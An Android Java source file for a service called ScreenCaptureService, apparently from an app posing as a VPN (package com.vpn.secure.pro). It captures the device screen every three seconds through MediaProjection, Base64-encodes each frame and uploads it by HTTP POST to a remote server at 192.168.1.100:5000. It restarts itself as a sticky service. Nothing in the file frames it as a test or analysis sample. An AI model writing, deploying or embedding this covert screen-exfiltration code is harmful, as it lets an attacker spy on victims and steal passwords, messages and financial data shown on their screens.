package com.vpn.secure.pro.services;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ScreenCaptureService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler();
    private Runnable captureRunnable;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MediaProjectionManager projectionManager =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = projectionManager.getMediaProjection(
            -1, intent.getParcelableExtra("data")
        );

        int width = getResources().getDisplayMetrics().widthPixels;
        int height = getResources().getDisplayMetrics().heightPixels;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height,
            getResources().getDisplayMetrics().densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
            imageReader.getSurface(), null, null
        );

        captureRunnable = new Runnable() {
            @Override
            public void run() {
                captureScreen();
                handler.postDelayed(this, 3000);
            }
        };
        handler.post(captureRunnable);
        return START_STICKY;
    }

    private void captureScreen() {
        Image image = imageReader.acquireLatestImage();
        if (image == null) return;

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            image.getPlanes()[0].getBuffer().rewind();
            byte[] data = new byte[image.getPlanes()[0].getBuffer().remaining()];
            image.getPlanes()[0].getBuffer().get(data);
            String base64 = Base64.encodeToString(data, Base64.DEFAULT);

            new Thread(() -> {
                try {
                    URL url = new URL("http://192.168.1.100:5000/upload_screen");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.getOutputStream().write(
                        ("{\"image\":\"" + base64 + "\",\"timestamp\":" +
                         System.currentTimeMillis() + "}").getBytes()
                    );
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e("Screen", "Error: " + e.getMessage());
                }
            }).start();

            image.close();
        } catch (Exception e) {
            Log.e("Screen", "Error: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (virtualDisplay != null) virtualDisplay.release();
        if (mediaProjection != null) mediaProjection.stop();
        handler.removeCallbacks(captureRunnable);
        super.onDestroy();
    }
                      }
